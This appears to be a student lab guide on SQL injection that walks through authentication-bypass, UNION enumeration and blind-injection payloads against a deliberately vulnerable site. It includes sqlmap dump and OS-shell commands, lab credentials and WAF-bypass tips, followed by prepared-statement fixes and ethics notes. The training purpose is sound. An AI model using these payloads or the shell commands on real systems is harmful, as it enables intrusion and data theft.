# SQL Injection Lab - Student Exercise Guide

## 🎯 Learning Objectives
- Understand SQL injection vulnerabilities
- Practice exploitation techniques
- Learn database enumeration methods
- Understand post-exploitation techniques
- Learn prevention methods

## 🚨 Important Notice
**This lab is for EDUCATIONAL PURPOSES ONLY**
- Only use these techniques in authorized lab environments
- Never attempt these attacks on production systems
- Unauthorized access to computer systems is illegal

---

## Part 1: Initial Reconnaissance

### Step 1: Explore the Application
1. Navigate to: `http://[server-ip]/`
2. Observe the login form
3. Try legitimate credentials:
   - Username: `john`
   - Password: `password123`
4. Note the error message for failed logins

### Step 2: Test for SQL Injection
Try these inputs and observe the behavior:

```sql
Username: admin'
Password: test
```

Notice any error messages? The application might reveal SQL syntax errors.

---

## Part 2: Authentication Bypass

### Exercise 1: Basic Comment Injection
**Goal:** Login without knowing the password

**Payload:**
```
Username: admin' --
Password: anything
```

**Why it works:**
The SQL query becomes:
```sql
SELECT * FROM users WHERE username = 'admin' -- ' AND password = 'anything'
```
Everything after `--` is commented out!

### Exercise 2: OR Condition Injection
**Payload:**
```
Username: admin' OR '1'='1
Password: anything
```

**Query becomes:**
```sql
SELECT * FROM users WHERE username = 'admin' OR '1'='1' AND password = 'anything'
```

### Exercise 3: Universal Bypass
**Payload:**
```
Username: ' OR 1=1 --
Password: anything
```

This returns all users and logs you in as the first user (usually admin).

---

## Part 3: Database Enumeration

Once logged in, use the search feature to explore the database.

### Exercise 4: Discover Database Name
**Search payload:**
```sql
' UNION SELECT 1,database(),3,4 --
```

### Exercise 5: List All Tables
**Search payload:**
```sql
' UNION SELECT 1,table_name,3,4 FROM information_schema.tables WHERE table_schema='vulnerable_db' --
```

**Expected tables:**
- users
- secrets
- access_logs

### Exercise 6: Discover Column Names
**For the secrets table:**
```sql
' UNION SELECT 1,column_name,3,4 FROM information_schema.columns WHERE table_name='secrets' --
```

### Exercise 7: Extract Sensitive Data
**Get all secrets:**
```sql
' UNION SELECT 1,secret_key,secret_value,4 FROM secrets --
```

**Combined extraction:**
```sql
' UNION SELECT 1,CONCAT(secret_key,' : ',secret_value),3,4 FROM secrets --
```

---

## Part 4: Advanced Techniques

### Exercise 8: Blind SQL Injection
When you can't see direct output, use boolean conditions:

**True condition (successful login):**
```
Username: admin' AND 1=1 --
```

**False condition (failed login):**
```
Username: admin' AND 1=2 --
```

### Exercise 9: Time-Based Blind Injection
Detect vulnerabilities using delays:
```
Username: admin' AND SLEEP(5) --
```
If the response takes 5 seconds, the injection worked!

### Exercise 10: Extract Data Character by Character
```sql
admin' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a' --
```

---

## Part 5: Using Automated Tools

### Exercise 11: SQLMap
```bash
# Basic scan
sqlmap -u "http://[server-ip]/login.php" --data="username=admin&password=test"

# Dump database
sqlmap -u "http://[server-ip]/login.php" --data="username=admin&password=test" --dump

# Get shell
sqlmap -u "http://[server-ip]/login.php" --data="username=admin&password=test" --os-shell
```

---

## Part 6: Post-Exploitation

### Exercise 12: Database Access
After finding MySQL credentials in the admin panel:

```bash
mysql -h [server-ip] -u root -prootpass123! vulnerable_db

# Commands to run:
SHOW TABLES;
SELECT * FROM secrets;
SELECT * FROM users;
```

### Exercise 13: System Access
Use discovered SSH credentials:
```bash
ssh labuser@[server-ip]
# Password: Lab123!@#

# Explore the system
ls -la /var/www/vulnerable-site/
cat /var/www/vulnerable-site/login.php
```

---

## Part 7: Finding the Flag

### Challenge: Capture The Flag
1. Use SQL injection to gain admin access
2. Find the hidden flag in the database
3. The flag format is: `FLAG{...}`

**Hints:**
- Check the secrets table
- Look for admin-only content
- Explore all database tables

---

## Part 8: Defense and Mitigation

### Exercise 14: Identify the Vulnerability
Look at the source code in `/var/www/vulnerable-site/login.php`

**Vulnerable code:**
```php
$query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
```

### Exercise 15: Write Secure Code
**Secure version using prepared statements:**
```php
$stmt = $conn->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->execute([$username, $password]);
```

### Prevention Techniques:
1. **Use Prepared Statements/Parameterized Queries**
2. **Input Validation**
   ```php
   if (!preg_match("/^[a-zA-Z0-9]+$/", $username)) {
       die("Invalid username");
   }
   ```
3. **Least Privilege Database Users**
4. **Web Application Firewall (WAF)**
5. **Regular Security Audits**

---

## 📝 Lab Report Questions

Answer these questions in your lab report:

1. **What makes this application vulnerable to SQL injection?**
2. **Explain how the `admin' --` payload works**
3. **What sensitive information did you discover?**
4. **How would you fix the vulnerable code?**
5. **What are three ways to prevent SQL injection?**
6. **Why is error-based SQL injection dangerous?**
7. **Explain the difference between blind and error-based SQL injection**
8. **What role does input validation play in security?**
9. **How can prepared statements prevent SQL injection?**
10. **What is the captured flag?**

---

## 🏆 Bonus Challenges

### Challenge 1: No Spaces
Perform SQL injection without using spaces (hint: use comments `/**/`)

### Challenge 2: WAF Bypass
If a basic WAF blocks common keywords, try:
- Case variations: `UnIoN SeLeCt`
- Encoding: URL encode special characters
- Comments: `UN/**/ION SE/**/LECT`

### Challenge 3: Second-Order SQL Injection
Register a new user with a malicious username, then trigger the injection later

### Challenge 4: Write a Detection Script
Create a Python script to detect SQL injection attempts in log files

---

## 📚 Additional Resources

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [PortSwigger SQL Injection](https://portswigger.net/web-security/sql-injection)
- [PentestMonkey SQL Injection Cheat Sheet](http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet)
- [SQLMap Documentation](https://github.com/sqlmapproject/sqlmap/wiki)

---

## ⚠️ Ethical Considerations

Remember:
- These skills are for defensive purposes
- Always get written authorization before testing
- Report vulnerabilities responsibly
- Use your knowledge to protect, not harm
- Follow your institution's code of conduct

---

## Lab Completion Checklist

- [ ] Successfully bypassed authentication
- [ ] Enumerated database structure
- [ ] Extracted sensitive data
- [ ] Found the flag
- [ ] Gained system access
- [ ] Analyzed vulnerable code
- [ ] Wrote secure code alternative
- [ ] Completed lab report